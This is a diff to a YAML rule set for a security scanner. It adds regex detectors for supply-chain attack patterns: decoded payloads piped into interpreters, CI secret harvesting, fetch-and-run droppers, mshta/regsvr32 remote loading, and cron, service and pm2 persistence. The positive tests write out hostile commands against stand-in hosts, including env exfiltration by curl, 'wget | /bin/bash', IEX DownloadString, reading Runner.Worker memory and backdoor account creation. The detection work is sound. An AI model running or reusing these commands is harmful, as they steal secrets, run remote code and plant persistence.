@@ -119,6 +119,65 @@ rules:
         - "cat f | shasum -a 256"
         - "tar -cf - . | ssh host tar -xf -"
 
+  - id: CAP.SH.DECODED_INTO_INTERPRETER.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: A decoded program is piped straight into an interpreter
+    message: >
+      This command base64-decodes content and pipes it into python, node, perl, ruby or a shell:
+      the program that runs is never written down where anyone reading the step would see it.
+    remediation: Decode the content in isolation and find what it runs.
+    provenance:
+      kind: research
+      reference: >
+        The compromised reviewdog/action-setup (2025) and aquasecurity trivy-action and
+        setup-trivy (2026) steps each ran `... | base64 -d | sudo python3` (review 98).
+    languages: [shell]
+    match:
+      kind: regex
+      patterns:
+        - '\bbase64[ \t]{1,8}(?:-d|-D|--decode)\b[^|\n]{0,60}\|[ \t]{0,8}(?:sudo[ \t]{1,16}(?:-[A-Za-z]{1,4}[ \t]{1,8}){0,3})?(?:python[0-9.]{0,4}|node|perl|ruby|(?:ba|z|da)?sh)\b'
+    tests:
+      positive:
+        - 'echo "$B" | base64 -d | sudo python3'
+        - "printf %s \"$X\" | base64 --decode | bash"
+      negative:
+        - 'echo "$KEY" | base64 -d > ~/.ssh/id_ed25519'
+        - "base64 -d cert.b64 | openssl x509 -noout"
+
+  - id: CAP.CI.RUNNER_SECRETS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: credential
+    title: Code harvests the CI runner's masked secrets
+    message: >
+      This file searches for the runner's secret records -- `"isSecret":true` entries, or the
+      memory of the Runner.Worker process -- which hold every secret of the job unmasked. Nothing
+      a step legitimately does needs another process's copy of the secrets it was given.
+    remediation: Remove the step; rotate every secret the jobs that ran it could read.
+    provenance:
+      kind: research
+      reference: >
+        tj-actions/changed-files and reviewdog/action-setup (2025): a decoded Python script read
+        Runner.Worker memory and the step grepped it for `"isSecret":true` (review 98, real).
+    languages: [shell, python, javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        - '\\?"isSecret\\?"[ \t]{0,4}:[ \t]{0,4}true'
+        - '\bRunner\.Worker\b[^\n]{0,200}/proc/|/proc/[^\n]{0,200}\bRunner\.Worker\b'
+    tests:
+      positive:
+        - "grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}'"
+        - "pid=$(pgrep Runner.Worker); cat /proc/$pid/maps"
+      negative:
+        - "echo '::add-mask::$TOKEN'"
+
   - id: CAP.SH.SPAWN.001
     version: 1.0.0
     category: policy
@@ -244,7 +303,8 @@ rules:
         # Bare `env` only. `env NAME=value cmd` is the env-prefix form and is
         # entirely ordinary; the signal is `env` with nothing after it, which is
         # the form that dumps every variable at once.
-        - '^[^#\n]*(?:^|[;&|`$(])\s*env\s*(?:$|[;&|)])'
+        # Closed by a backtick too: `` curl -d "`env`" `` is the substitution written the old way.
+        - '^[^#\n]*(?:^|[;&|`$(])\s*env\s*(?:$|[;&|)`])'
         - '\bprintenv\b'
         - '\bGet-ChildItem\s+Env:'
         - '\.ssh/id_|\.aws/credentials|\.npmrc|\.netrc|\.docker/config\.json|\.kube/config'
@@ -260,6 +320,7 @@ rules:
     tests:
       positive:
         - "curl -d \"$(env)\" https://x.example"
+        - "curl -X POST -d \"`env`\" x.example/env"
         - "cat ~/.aws/credentials"
         - "curl -d \"$AWS_SECRET_ACCESS_KEY\" https://x.example"
         - "echo $GITHUB_TOKEN | base64"
@@ -298,6 +359,9 @@ rules:
         # `Invoke-RestMethod` are how one-liners are written.
         - '\b(?:[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Rr][Ee][Ss][Tt][Mm][Ee][Tt][Hh][Oo][Dd]|[Ii][Ww][Rr]|[Ii][Rr][Mm])\b|\b(?:[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Ss][Tt][Rr][Ii][Nn][Gg]|[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Ff][Ii][Ll][Ee]|[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Dd][Aa][Tt][Aa])\b'
         - '\bscp\s|\brsync\s'
+        # A Windows program handed a URL fetches it: `mshta https://...`, `regsvr32 /i:https://...`.
+        - '\b[Mm][Ss][Hh][Tt][Aa](?:\.[Ee][Xx][Ee])?["\x27]?\s{1,8}["\x27]?https?://'
+        - '\b[Rr][Ee][Gg][Ss][Vv][Rr]32(?:\.[Ee][Xx][Ee])?\b[^\n]{0,80}/[Ii]:["\x27]?https?://'
     tests:
       positive:
         - "curl -sSL https://example.com/x.sh"
@@ -354,8 +418,19 @@ rules:
     match:
       kind: regex
       patterns:
-        - '>>\s*[^\n]*\.(?:bashrc|bash_profile|zshrc|profile)\b'
-        - '\bcrontab\s+-|/etc/cron\.[a-z]+/'
+        - '>>(?>\s*\n)?[^\n]*\.(?:bashrc|bash_profile|zshrc|profile)\b'
+        # `crontab -` installs what it reads, `crontab -u user <file>` a file. `-l` lists, `-e` opens an editor for a
+        # person and `-r` removes: none plants anything, and incident-response scripts save `crontab
+        # -l` as evidence (review 98, real skills). A pipeline that lists, edits and reinstalls still
+        # ends in `crontab -`.
+        - '\bcrontab\s+(?:-u\s+\S+\s+)?-(?![lreu]\b)|\bcrontab\s+-u\s+\S+\s+(?!-)\S|/etc/cron\.[a-z]+/'
+        # ...unless the editor is a command: with EDITOR or VISUAL set (on the line, through `env`,
+        # or exported earlier in the script) `crontab -e` installs what that command writes and no
+        # person sees an editor (`EDITOR="sed -i '$a ...'" crontab -e`, `VISUAL=tee crontab -e < f`).
+        # Bounded and linear: the span reads at most 4,000 characters and stops at the next
+        # assignment (the last one before `crontab -e` is the one it runs with), so a script of many
+        # assignments is read once, not once per assignment.
+        - '\b(?:EDITOR|VISUAL)=\S(?:(?!EDITOR=)(?!VISUAL=)[\s\S]){0,4000}?\bcrontab\s+(?:-u\s+\S+\s+)?-e\b'
         # A unit path that is being WRITTEN. The bare path was listed and an
         # uninstaller names exactly the same paths as the installer: `pi-hole`'s
         # `uninstall.sh` runs `rm -f /etc/systemd/system/pihole-FTL.service` and then
@@ -368,14 +443,24 @@ rules:
         # `find ... -delete` -- and the ones that ARE a write are four.
         #
         # `systemctl disable` is not an alternative to `enable` here, and never was.
-        - '\b(?:cp|mv|install|ln|tee|cat|echo|printf|touch|mkdir)\b[^\n]{0,100}?/etc/systemd/system/'
+        #
+        # `echo`, `printf` and `cat` are NOT in the verb list: they write only by redirect, which
+        # the `>`/`>>` alternatives already catch, so listing them as `verb ... path` matched a
+        # path INSIDE an echoed string -- an audit script's `echo "--- User LaunchAgents ---"`
+        # header read as installing one (review 98). `tee` takes the path as an argument, so it
+        # stays.
+        - '\b(?:cp|mv|install|ln|tee|touch|mkdir)\b[^\n]{0,100}?/etc/systemd/system/'
         - '>[ \t]{0,8}[^\n]{0,60}?/etc/systemd/system/'
         # No `path ... >` alternative. `rm -f /etc/systemd/system/x.service &>
         # /dev/null` has a redirect AFTER the path and writes nothing to it; a write
         # puts the redirect first, which the alternative above already covers.
-        - '\bsystemctl\s+enable\b'
-        - '\blaunchctl\s+load\b'
-        - '\b(?:cp|mv|install|ln|tee|cat|echo|printf|touch|mkdir|defaults\s+write)\b[^\n]{0,100}?(?:LaunchAgents|LaunchDaemons)'
+        - '\bsystemctl\s+(?:--user\s+)?enable\b'
+        - '\blaunchctl\s+(?:load|bootstrap)\b'
+        # A process manager keeping the code running past the install and starting it again: pm2's
+        # `start` (it restarts what it runs), `startup` and `save` (at boot), forever's `start`
+        # (npm work half: crypto-encrypt-ts's postinstall runs `pm2` on its own start script).
+        - '\bpm2\s+(?:start|startup|save)\b|\bforever\s+start\b'
+        - '\b(?:cp|mv|install|ln|tee|touch|mkdir|defaults\s+write)\b[^\n]{0,100}?(?:LaunchAgents|LaunchDaemons)'
         - '>[ \t]{0,8}[^\n]{0,60}?(?:LaunchAgents|LaunchDaemons)'
         - '\bRegister-ScheduledTask\b|\bschtasks\s+/create\b'
         - 'CurrentVersion\\\\Run'
@@ -391,18 +476,37 @@ rules:
         - "net user /add flask 123qwe123"
         - "net localgroup \"Remote Desktop Users\" flask /add"
         - "useradd -m -s /bin/bash backdoor"
+        - "pm2 start ./scripts/start.js --name svc"
+        - "forever start app.js"
+        - "systemctl --user enable svc.service"
+        - "launchctl bootstrap gui/501 ~/Library/LaunchAgents/svc.plist"
         - "usermod -aG sudo backdoor"
         - "echo 'curl x|sh' >> ~/.bashrc"
         - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
+        - "crontab -u root -"
+        - "EDITOR=\"sed -i '$a * * * * * /tmp/x'\" crontab -e"
+        - "env VISUAL=tee crontab -e < job.txt"
+        - "EDITOR=tee sudo crontab -u root -e < job.txt"
+        - "export VISUAL=tee\ncrontab -e < job.txt"
+        - "export EDITOR='sed -i 1i@reboot\\ /tmp/x'\nprepare\ncrontab -e"
         - "cp agent.service /etc/systemd/system/agent.service"
         - "systemctl enable agent.service"
       negative:
+        - "pm2 list"
+        - "pm2 logs svc"
+        - "forever list"
         - "systemctl status nginx"
         - "cat ~/.bashrc"
         - "rm -f /etc/systemd/system/pihole-FTL.service"
         - "rm -rf /etc/systemd/system/pihole-FTL.service.d"
         - "net user flask"
         - "id -u someone"
+        - "crontab -l > \"$EVIDENCE_DIR/crontab_current.txt\""
+        - "crontab -u alice -l"
+        - "echo 'Run crontab -e to edit your schedule'"
+        - "crontab -e"
+        - "echo '--- User LaunchAgents ---'"
+        - "printf 'inspecting /etc/systemd/system contents\\n'"
 
   # ---------------------------------------------------------------------
   # Fetch-execute adjacency
@@ -441,13 +545,16 @@ rules:
         # The program is the quoted one-liner on the command line and the fetched bytes
         # are its INPUT. `curl ... | sh` is the opposite: stdin is the program.
         #
+        # The interpreter may be named by its path (`| /bin/bash`, `| /usr/bin/python3`), as the
+        # 2025 Go typosquats' assembled command did (review 98).
+        #
         # So a code flag disqualifies the match -- `-e`, `-c`, `-n`, `-l`, `-p`, `-E`,
         # `-f` all mean the program came from the argument list. `sh -s` does not: it
         # reads stdin and passes the rest as positional arguments, which is exactly how
         # `curl https://sh.rustup.rs | sh -s -- -y` works, and that stays matched.
-        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b(?![ \t]+-[ceEflnp])'
-        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?python[0-9.]*\b(?![ \t]+-[cm])'
-        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:node|perl|ruby|php)\b(?![ \t]+-[ceEflnprw])'
+        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:/(?:usr/)?(?:local/)?bin/)?(?:ba|z|k|da)?sh\b(?![ \t]+-[ceEflnp])'
+        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:/(?:usr/)?(?:local/)?bin/)?python[0-9.]*\b(?![ \t]+-[cm])'
+        - '\b(?:curl|wget|fetch|Invoke-WebRequest|iwr)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:/(?:usr/)?(?:local/)?bin/)?(?:node|perl|ruby|php)\b(?![ \t]+-[ceEflnprw])'
         # PowerShell, where `irm`/`Invoke-RestMethod` returns the body as a string and is the
         # usual half of the one-liner, and `curl`/`wget` are aliases of `iwr` in Windows
         # PowerShell 5.
@@ -457,6 +564,12 @@ rules:
         - '\b(?:[Ii][Ee][Xx]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ee][Xx][Pp][Rr][Ee][Ss][Ss][Ii][Oo][Nn])\b[ \t]{0,8}\(?[ \t]{0,8}\(?[ \t]{0,8}(?:[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Rr][Ee][Ss][Tt][Mm][Ee][Tt][Hh][Oo][Dd]|[Ii][Rr][Mm]|curl|wget)\b'
         # Fetched to a file, then started, on one line.
         - '\b(?:[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|curl|wget)\b[^\n]{0,200}-[Oo][Uu][Tt][Ff][Ii][Ll][Ee]\b[^\n]{0,200}\b(?:[Ss][Tt][Aa][Rr][Tt]-[Pp][Rr][Oo][Cc][Ee][Ss][Ss]|[Ss][Aa][Pp][Ss])\b'
+        # Fetched to a file and run by name in the next statement: PowerShell's call operator, `start`,
+        # `cmd /c`. `curl.exe -k -L -Ss "https://files.catbox.moe/x.bat" -o $o; & $o` -- the whole
+        # payload of two malicious Solidity extensions, in a `spawn('powershell', ...)` (review 98).
+        # What runs is a variable or an executable's name; a download that is then read or unpacked
+        # is not this.
+        - '\b(?:curl|wget|[Ii][Ww][Rr]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt])(?:\.exe)?\b[^\n;]{0,240}\s(?:-o|--output|-[Oo][Uu][Tt][Ff][Ii][Ll][Ee])\s[^\n;]{0,160};\s{0,4}(?:&|[Ss][Tt][Aa][Rr][Tt](?:-[Pp][Rr][Oo][Cc][Ee][Ss][Ss])?|cmd(?:\.exe)?\s{1,4}/[cC])\s{0,4}["\x27]?(?:\$[\w:]{1,40}\b|[^\s"\x27;]{1,200}\.(?:bat|cmd|exe|ps1|vbs|scr|msi)\b)'
         # The forms with no pipe. `eval "$(curl ...)"` and `IEX (New-Object
         # Net.WebClient).DownloadString(...)` are the two most recognisable
         # lines in the literature after `curl | sh`, and matching only the pipe
@@ -475,9 +588,18 @@ rules:
         - '(?<![$]\()\b(?:eval|source)\b[^\n]{0,40}[$]\([^)\n]{0,200}\b(?:curl|wget|fetch)\b'
         - '\b(?:eval|source|\.)\s[^\n]{0,40}<\([^)\n]{0,200}\b(?:curl|wget|fetch)\b'
         - '\b(?:IEX|Invoke-Expression)\b[^\n]{0,120}\b(?:DownloadString|DownloadData|DownloadFile)\b'
+        # Windows programs that fetch and run in one step, given a URL: `mshta https://...` runs
+        # a remote HTA, `regsvr32 /i:https://... scrobj.dll` a remote scriptlet. Neither has a
+        # use for a URL other than running what it serves (review 98: abhiktestnpm).
+        - '\b[Mm][Ss][Hh][Tt][Aa](?:\.[Ee][Xx][Ee])?["\x27]?\s{1,8}["\x27]?https?://'
+        - '\b[Rr][Ee][Gg][Ss][Vv][Rr]32(?:\.[Ee][Xx][Ee])?\b[^\n]{0,80}/[Ii]:["\x27]?https?://'
     tests:
       positive:
+        - '$o="$env:TEMP\\1.cmd"; & curl.exe -k -L -Ss "https://files.example.invalid/x.bat" -o $o; & $o'
+        - 'curl -k -L -Ss https://files.example.invalid/x.bat -o $env:TEMP\\1.cmd; & $env:TEMP\\1.cmd'
         - "curl -sSL https://example.invalid/x | bash"
+        # The interpreter named by its path: the Go typosquats' `wget -O - URL | /bin/bash &`.
+        - "wget -O - https://example.invalid/s/x | /bin/bash &"
         - "eval \"$(curl -fsSL https://example.invalid/i.sh)\""
         - "IEX (New-Object Net.WebClient).DownloadString($u)"
         - "wget -qO- https://example.invalid/x | sudo sh"
@@ -487,7 +609,13 @@ rules:
         - "iex (iwr https://example.invalid/x).Content"
         - "Invoke-Expression (Invoke-RestMethod https://example.invalid/x)"
         - "iwr https://example.invalid/p.exe -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"
+        - '"C:\\Windows\\system32\\mshta.exe" https://example.invalid/a.hta'
+        - "regsvr32 /s /n /u /i:https://example.invalid/a.sct scrobj.dll"
       negative:
+        - "mshta.exe local\\app.hta"
+        - "regsvr32 /s mylib.dll"
+        - 'curl -L -o release.json https://api.example.invalid/latest; jq .tag release.json'
+        - 'Invoke-WebRequest https://example.invalid/a.zip -OutFile a.zip; Expand-Archive a.zip'
         - "iwr https://example.invalid/x -OutFile release.zip"
         - "irm https://example.invalid/api/version | ConvertFrom-Json"
         - "ps aux | grep nginx"
@@ -722,3 +850,196 @@ rules:
       negative:
         - "ConvertFrom-Json $text"
         - "cat data.json"
+
+  # ---------------------------------------------------------------------
+  # Windows batch (.bat, .cmd)
+  #
+  # What an extension or a package ships to run on Windows. A batch file has no
+  # pipe into an interpreter to speak of: its dropper downloads to a file and
+  # starts the file, two lines apart, and that pair is the one act `curl | sh`
+  # is in shell. `rem` and `::` are not treated as comments: matched mid-line
+  # they would be wrong, and being wrong towards "this is code" costs nothing.
+  # ---------------------------------------------------------------------
+  - id: CAP.BAT.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    title: Opens an outbound network connection
+    message: >
+      This batch file transfers data over the network: curl, wget, bitsadmin,
+      certutil's URL cache, or PowerShell's web cmdlets called from it.
+    remediation: >
+      Confirm the destination is a fixed, known host, and that what is fetched
+      is verified before anything uses it.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        # A transfer tool run as a command, as the shell rule reads `curl`: the address is as
+        # often a variable (`curl -o "%EXE%" "%EXE_URL%"`) as a literal.
+        - '(?i:(?:^|[\s(&|@"])(?:curl|wget)(?:\.exe)?\s)'
+        - '(?i:\bbitsadmin(?:\.exe)?\b[^\n]{0,200}/transfer\b|\bcertutil(?:\.exe)?\b[^\n]{0,200}-urlcache\b)'
+        - '(?i:\b(?:invoke-webrequest|invoke-restmethod|iwr|irm|start-bitstransfer|downloadfile|downloadstring|downloaddata)\b)'
+    tests:
+      positive:
+        - 'curl -fsSL -o "%TEMP%\x.exe" https://example.invalid/x.exe'
+        - 'curl -f -s -L -o "%EXE%" "%EXE_URL%"'
+        - 'bitsadmin /transfer job https://example.invalid/x.exe "%TEMP%\x.exe"'
+        - 'powershell -c "(New-Object Net.WebClient).DownloadFile(''https://example.invalid/a'', ''a'')"'
+      negative:
+        - 'echo Installing the theme'
+        - 'set CURL_HOME=%~dp0tools'
+        - 'copy /Y settings.json "%APPDATA%\Code\User\"'
+
+  - id: CAP.BAT.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloads a file and starts it
+    message: >
+      This batch file downloads to a file and, a few lines later, starts an
+      executable or the file a variable names. What runs is whatever the remote
+      host served at that moment; nothing about it is captured by review, by a
+      lockfile, or by any artefact this repository controls.
+    remediation: >
+      Ship the program, or verify the download against a known digest before
+      it is started.
+    languages: [batch]
+    baseline_hits: 0
+    match:
+      kind: regex
+      patterns:
+        # The download, then within about 6,000 characters (a few dozen lines) a `start` (or Start-Process) of an
+        # executable or of a variable -- `start "" /B "%EXE%"`. Not `call`: a
+        # build script that downloads a jar and later calls a site hook is not this.
+        - '(?i:\b(?:curl(?:\.exe)?\b[^\n]{0,300}\s(?:-o|--output)\s|bitsadmin(?:\.exe)?\b[^\n]{0,300}/transfer\b|certutil(?:\.exe)?\b[^\n]{0,300}-urlcache\b|(?:invoke-webrequest|iwr|wget|start-bitstransfer)\b[^\n]{0,300}-(?:outfile|destination)\b|\.downloadfile\s{0,4}\()[\s\S]{0,6000}?\n[^\n]{0,80}(?:^|[\s(&|@])start(?:-process)?\s{1,4}[^\n]{0,60}(?:%\w{1,40}%|\.(?:exe|scr|com|vbs|msi|ps1)\b))'
+    tests:
+      positive:
+        - "set \"EXE=%TEMP%\\a\\a.exe\"\ncurl -f -s -L -o \"%EXE%\" \"%URL%\" 2>nul\nif exist \"%EXE%\" (\nstart \"\" /B \"%EXE%\" >nul 2>&1\n)"
+        - "bitsadmin /transfer j https://example.invalid/p.exe %TEMP%\\p.exe\nstart %TEMP%\\p.exe"
+      negative:
+        - "curl -o node.zip https://example.invalid/node.zip\ntar -xf node.zip\necho done"
+        - "start \"\" \"%~dp0app.exe\""
+        - "curl -o x.jar https://example.invalid/x.jar\ncall mvn package"
+
+  - id: CAP.BAT.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts another process
+    message: >
+      This batch file starts a process beyond its own commands: `start`, a new
+      command interpreter, PowerShell, or one of Windows' script and library
+      hosts.
+    remediation: >
+      No action for this signal alone.
+    languages: [batch]
+    # One benign file, measured without regard to language: the prose "start a" in
+    # corpus/benign/ops/deploy.py. In a scan the rule reads batch files only.
+    baseline_hits: 1
+    match:
+      kind: regex
+      patterns:
+        - '(?i:(?:^|[\s(&|@])start(?:-process)?\s{1,4}["/%\w.\\])'
+        - '(?i:\b(?:cmd|powershell|pwsh)(?:\.exe)?\s{1,4}(?:/[ck]\b|-[a-z]))'
+        - '(?i:\b(?:wscript|cscript|mshta|rundll32|regsvr32)(?:\.exe)?\s)'
+    tests:
+      positive:
+        - 'start "" /B "%EXE%"'
+        - 'powershell -NoProfile -Command "Get-Date"'
+        - 'rundll32 shell32.dll,Control_RunDLL'
+      negative:
+        - 'echo restart the editor when it is done'
+        - 'set START=1'
+
+  - id: CAP.BAT.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Executes a string as code
+    message: >
+      This batch file hands a string to an interpreter as its program: an
+      encoded PowerShell command, `Invoke-Expression`, or a variable's contents
+      run as a command line.
+    remediation: >
+      Run a reviewed script by path instead of a string assembled or decoded at
+      runtime.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,200}\s-(?:e|ec|en|enc|encodedcommand)\s{1,4}[A-Za-z0-9+/=]{16})'
+        - '(?i:\b(?:iex|invoke-expression)\b)'
+        - '(?i:\bcmd(?:\.exe)?\s{1,4}/[ck]\s{1,4}"?%\w{1,40}%"?\s{0,4}$)'
+    tests:
+      positive:
+        - 'powershell -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'
+        - 'powershell -c "iex (gc a.txt -Raw)"'
+        - 'cmd /c %PAYLOAD%'
+      negative:
+        - 'powershell -File build.ps1'
+        - 'cmd /c npm test'
+
+  - id: CAP.BAT.PERSIST.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: persist
+    title: Installs something that survives a restart
+    message: >
+      This batch file registers something to run again later: a scheduled task,
+      a Run key, a service, or a file in the Startup folder.
+    remediation: >
+      Confirm the user asked for something to run at every sign-in or boot.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:\bschtasks(?:\.exe)?\b[^\n]{0,80}/create\b)'
+        - '(?i:\breg(?:\.exe)?\s{1,4}add\b[^\n]{0,200}\\currentversion\\(?:run|runonce)\b)'
+        - '(?i:\bsc(?:\.exe)?\s{1,4}create\b)'
+        - '(?i:\\start menu\\programs\\startup\b)'
+    tests:
+      positive:
+        - 'schtasks /create /tn upd /tr "%EXE%" /sc onlogon'
+        - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v u /d "%EXE%"'
+        - 'copy a.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"'
+      negative:
+        - 'reg query HKLM\Software\Node'
+        - 'schtasks /query'
+
+  - id: CAP.BAT.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands an archive
+    message: >
+      This batch file unpacks an archive: tar, expand, 7-Zip, unzip or
+      PowerShell's Expand-Archive.
+    remediation: >
+      No action for this signal alone.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:\btar(?:\.exe)?\s{1,4}-?[a-z]{0,4}x)'
+        - '(?i:\b(?:expand-archive|unzip|7z(?:\.exe)?\s{1,4}[xe]\b|expand(?:\.exe)?\s{1,4}\S))'
+    tests:
+      positive:
+        - 'tar -xf node.zip'
+        - 'powershell Expand-Archive a.zip -DestinationPath b'
+        - '7z x payload.7z'
+      negative:
+        - 'tar -cf out.tar build'
+        - 'echo expanded'
